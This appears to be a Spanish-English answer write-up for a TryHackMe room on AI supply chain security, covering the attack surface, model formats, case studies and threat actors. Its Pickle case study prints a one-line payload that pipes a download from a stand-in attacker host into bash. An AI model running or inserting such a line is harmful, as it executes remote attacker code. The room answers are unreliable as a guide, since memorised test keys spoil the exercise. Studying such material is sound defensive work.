# Understanding AI Supply Chains [MEDIUM]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** MEDIUM
* **Tipo / Type:** Theory + Lab
* **Slug:** `understanding-ai-supplychains`
* **Link:** https://tryhackme.com/room/understanding-ai-supplychains
* **Sección / Section:** AI Supply Chain Security (Section 4 of 5)
* **Fuente / Source:** [RAHULKATARA1/TryHackMe-AI-Security-Path](https://github.com/RAHULKATARA1/TryHackMe-AI-Security-Path) — `Section-4-AI-Supply-Chain-Security\01-understanding-ai-supply-chains\README.md`

---

## Solucionario de Tareas / Task Solutions

### Resumen de la Sala / Room Overview

La cadena de suministro de IA es el pipeline completo de componentes, dependencias y servicios que intervienen en la construcción y despliegue de un sistema de IA — desde datos de entrenamiento crudos y pesos de modelos de terceros hasta la infraestructura cloud que sirve predicciones en producción. Igual que los ataques a cadenas de suministro de software que definieron los incidentes de SolarWinds y XZ Utils, **la cadena de suministro de IA es una superficie de ataque de alto valor y baja visibilidad**.

Esta room mapea cada eslabón de la cadena de suministro de IA, explica por qué cada eslabón es un punto de compromiso potencial, e introduce los actores de amenaza, motivaciones e incidentes del mundo real que hacen esta categoría tan crítica de entender.

**Lo que aprenderás:**
* La anatomía de extremo a extremo de una cadena de suministro de IA.
* Componentes clave: datasets, modelos pre-entrenados, frameworks ML, infraestructura de serving.
* Por qué las cadenas de suministro de IA son únicamente peligrosas comparadas con las cadenas de suministro de software tradicionales.
* Incidentes reales de cadenas de suministro de IA y sus consecuencias.
* Perfiles de actores de amenaza y motivaciones para atacar pipelines de IA.

---

### Conceptos Clave / Key Concepts

#### La Cadena de Suministro de IA: Mapa de Extremo a Extremo

```
┌─────────────────────────────────────────────────────────────────────┐
│                    AI SUPPLY CHAIN                                   │
│                                                                     │
│  [Data Sources]──►[Data Pipeline]──►[Pre-trained Models]            │
│       │                │                    │                       │
│  Web scrapes      ETL scripts          HuggingFace Hub              │
│  Public datasets  Data labelling       PyPI packages                │
│  Synthetic data   Feature stores       Model registries             │
│                                              │                      │
│                              [Fine-tuning / Training]               │
│                                              │                      │
│                              [Model Packaging & Registry]           │
│                                              │                      │
│                              [Serving Infrastructure]               │
│                                              │                      │
│                              [End User / Application]               │
└─────────────────────────────────────────────────────────────────────┘
```

**Cada flecha es un límite de confianza. Cada componente es un punto de compromiso potencial.**

#### Componente 1 — Datos de Entrenamiento

Los datos de entrenamiento son el **genoma** de un modelo de machine learning. Lo que entra en los datos determina lo que el modelo aprende — incluyendo cualquier comportamiento malicioso horneado por un atacante.

**Fuentes de riesgo de datos de entrenamiento:**
- **Datasets web-scraped** (Common Crawl, LAION) — cualquiera puede influir en lo que se scrapea controlando contenido web.
- **Vendedores de datos de terceros** — procedencia opaca, sin pista de auditoría.
- **Plataformas de anotación abiertas** — los etiquetadores crowdsourced pueden insertar muestras mal etiquetadas o envenenadas.
- **Generadores de datos sintéticos** — si el generador en sí está comprometido, todos los datos generados están contaminados.

#### Componente 2 — Pesos de Modelos Pre-entrenados

La explosión del intercambio de modelos abiertos (Hugging Face, Ollama, Civitai) significa que la mayoría de las organizaciones construyen sobre **pesos pre-entrenados de terceros** en lugar de entrenar desde cero. Estos pesos son blobs binarios — **no hay un "equivalente de revisión de código fuente" para pesos de modelos**.

**Riesgos clave:**
- Los pesos pueden modificarse post-entrenamiento para incrustar backdoors.
- Los formatos de serialización de modelos (Pickle, SafeTensors, ONNX) pueden llevar **payloads ejecutables maliciosos**.
- La procedencia de los pesos casi nunca se verifica criptográficamente.

#### Componente 3 — Frameworks y Librerías ML

El ecosistema Python ML es vasto y débilmente gobernado:

| Riesgo del Ecosistema | Ejemplo |
|----------------|---------|
| **Typosquatting** | `torchvision` vs `torch-vision` — paquete malicioso con nombre similar |
| **Dependency confusion** | Nombre de paquete interno reclamado en PyPI público |
| **Mantenedor comprometido** | Ataque de cadena de suministro vía toma de cuenta de un paquete popular |
| **Dependencias transitivas** | 3 niveles de profundidad en `requirements.txt` — ¿conoces los 847 paquetes? |

#### Componente 4 — Infraestructura de Pipeline ML

La infraestructura de cómputo que ejecuta entrenamiento e inferencia es altamente privilegiada:
- Clusters de entrenamiento con acceso a petabytes de datos sensibles.
- Registros de modelos (MLflow, Weights & Biases, Neptune) que almacenan todas las versiones de modelos.
- Pipelines CI/CD que reentrenan y despliegan modelos automáticamente.
- **Un pipeline MLOps comprometido puede reentrenar y redesplegar silenciosamente un modelo con backdoor.**

#### Componente 5 — Infraestructura de Serving

La capa de inferencia de modelos enfrenta ataques web tradicionales **más** los específicos de IA:
- Imágenes de contenedor con malware incrustado.
- APIs de inferencia mal configuradas que exponen endpoints de admin.
- Instancias GPU con malware de cryptomining consumiendo cómputo caro.

#### Por Qué las Cadenas de Suministro de IA Son Únicamente Peligrosas

| Propiedad | Software Tradicional | Cadenas de Suministro de IA |
|----------|---------------------|-----------------|
| **Auditabilidad** | El código fuente es legible por humanos | Los pesos de modelo son binarios, opacos |
| **Procedencia** | Historial de Git, commits firmados | Casi ningún estándar equivalente |
| **Radio de explosión** | Afecta a usuarios de ese software | Afecta a todos los modelos fine-tuneados aguas abajo |
| **Detección** | Análisis estático, escáneres CVE | Sin herramientas equivalentes de escaneo de pesos |
| **Payload de exploit** | Código/binario | Datos, gradientes, triggers de backdoor |

---

### Tarea 1 — Fundamentos de Cadena de Suministro / Supply Chain Fundamentals

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| In the SolarWinds attack, where in the supply chain was the malicious code injected? | `Build process` |
| While installing `torch` Pip also pulls in `filelock`, which you never listed. What type of dependency is `filelock`? | `transitive dependency` |

**Notas:**
> La superficie de ataque más subestimada es el **registro de modelos**. En la mayoría de los flujos de trabajo MLOps, los modelos se promueven automáticamente de staging a producción basándose en el rendimiento de benchmarks — no en checks de seguridad. Un modelo con backdoor que rinde bien en benchmarks navegará directo a producción.

---

### Tarea 2 — Componentes de la Cadena de Suministro de IA / AI Supply Chain Components

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What are the four key components of an AI supply chain? (listed alphabetically) | `Datasets, Dependencies, Frameworks, Models` |
| What do model files contain that allows them to run code when loaded? | `serialised objects` |

---

### Tarea 3 — Formatos de Modelo / Model Formats

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the dominant file format for running local large language models such as LLaMA, Mistral, and Qwen? | `gguf` |

---

### Tarea 4 — Capas de Ataque / Attack Layers

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| At which layer of the AI supply chain do pickle-based attacks occur? | `Model layer` |
| Which level of model attack is eliminated by converting to SafeTensors format? | `Serialisation-level` |
| Researchers find that 0.1% of a public training dataset has been replaced with crafted samples designed to introduce a backdoor. Which attack layer does this represent? | `Data Layer` |

---

### Tarea 5 — Ataques de Dependencia e Infraestructura / Dependency and Infrastructure Attacks

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| The torchtriton package exploited pip's version resolution to install a public package over an internal one. Which of the four attack layers does this target? | `Dependency Layer` |
| The @solana/web3.js attacker stole a maintainer's credentials to push malicious updates to a legitimate, high-trust repository. Which attack layer does this represent? | `Infrastructure Layer` |

---

### Tarea 6 — Lab Práctico / Practical Lab

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| In the static site, what is the name of the unverified organisation that uploaded the model? | `trustworthy-ai-models` |
| How many downloads does this model have (last month)? | `127` |
| What file format does the verified model (google-bert/bert-base-uncased) use for its weights? | `SafeTensors` |

---

### Incidentes Reales de Cadena de Suministro de IA / Real-World AI Supply Chain Incidents

**Caso de Estudio 1 — El Incidente de Pickle Malicioso de Hugging Face (2023):**
Los investigadores descubrieron **más de 100 repositorios de modelos maliciosos** en Hugging Face que contenían modelos serializados con el formato Python Pickle. Los archivos Pickle pueden ejecutar código Python arbitrario en la deserialización — lo que significa que simplemente *descargar y cargar* el modelo era suficiente para comprometer la máquina de la víctima.

**Payload incrustado en el archivo `.pkl` malicioso:**
```python
# Pickle deserialization executes this automatically on load
import os
os.system("curl http://attacker.io/c2 | bash")
```

**Caso de Estudio 2 — Paquetes PyPI Envenenados Dirigidos a Ingenieros ML (2023):**
Múltiples campañas desplegaron paquetes con nombres como `torchserve-api`, `ml-utils-core` y `sklearn-extended` en PyPI. Cuando se instalaban (a menudo vía `pip install` desde un README o blog de tutorial), ejecutaban malware de robo de credenciales dirigido a claves AWS, tokens de Hugging Face y API keys de Weights & Biases.

**Caso de Estudio 3 — ShadowRay — RCE en Anyscale Ray Framework (2024):**
CVE-2023-48022 — Un RCE no autenticado crítico en el framework de entrenamiento ML distribuido Ray de Anyscale fue explotado activamente en la naturaleza. Los atacantes obtuvieron acceso a clusters de entrenamiento ML, exfiltraron pesos de modelos y desplegaron cryptominers en infraestructura GPU cara. Se estiman miles de clusters comprometidos.

---

### Perfiles de Actores de Amenaza / Threat Actor Profiles

| Actor de Amenaza | Motivación | Técnica Típica |
|-------------|------------|-------------------|
| **APTs de Estado-Nación** | Recolección de inteligencia, robo de PI, sabotaje de capacidades de IA del adversario | Acceso a largo plazo a infraestructura de entrenamiento; backdooring sutil de modelos |
| **Grupos Cibercriminales** | Ganancia financiera vía cryptomining en clusters GPU, robo de credenciales | Paquetes PyPI maliciosos, exploits de Pickle |
| **Competidores** | Espionaje corporativo, robo de modelos | Exfiltrar pesos de modelos propietarios |
| **Amenazas Internas** | Sabotaje, ganancia personal | Envenenar datos de entrenamiento, filtrar pesos |
| **Hacktivistas** | Sabotaje ideológico de sistemas de IA | Envenenamiento de datasets para causar sesgo o fallo del modelo |

---

### Conclusiones Personales / Personal Takeaways

* La seguridad de la cadena de suministro de IA es esencialmente **seguridad de cadena de suministro tradicional + 3 nuevas dimensiones**: pesos de modelos (artefactos binarios opacos), datos de entrenamiento (un medio de ataque completamente nuevo) e infraestructura específica de IA (clusters GPU, registros de modelos, pipelines MLOps).
* La **vulnerabilidad de Pickle** es un síntoma de un problema cultural más profundo: la comunidad ML se movió rápido y adoptó herramientas poderosas sin revisión de seguridad. El ecosistema está mejorando gradualmente (SafeTensors, model cards firmadas), pero millones de archivos `.pkl` existentes en la naturaleza siguen siendo peligrosos.
* El **modelo de confianza en ML está roto por defecto**. `pip install` + `model.load()` en un Jupyter notebook es como operan la mayoría de los data scientists — y ambos pasos pueden ejecutar silenciosamente código del atacante. La higiene de seguridad en flujos de trabajo ML está años atrás del mundo de seguridad de aplicaciones.
* Los ataques a cadenas de suministro de IA tienen un enorme **radio de explosión multiplicativo**. Un backdoor inyectado en un modelo pre-entrenado open-source popular (como un checkpoint temprano de un LLM popular) se propaga a cada organización que hace fine-tuning desde él — potencialmente miles de modelos aguas abajo.

---

* **Fuente / Source:**
  * [RAHULKATARA1/TryHackMe-AI-Security-Path — understanding-ai-supply-chains](https://github.com/RAHULKATARA1/TryHackMe-AI-Security-Path/tree/main/Section-4-AI-Supply-Chain-Security/01-understanding-ai-supply-chains)
  * [Answers for the TryHackMe Understanding AI Supply Chains Room — Simon Taplin](https://simontaplin.net/2026/06/01/answers-for-the-tryhackme-understanding-ai-supply-chains-room/)

*Documentación para propósitos educativos y registro de CTF.*
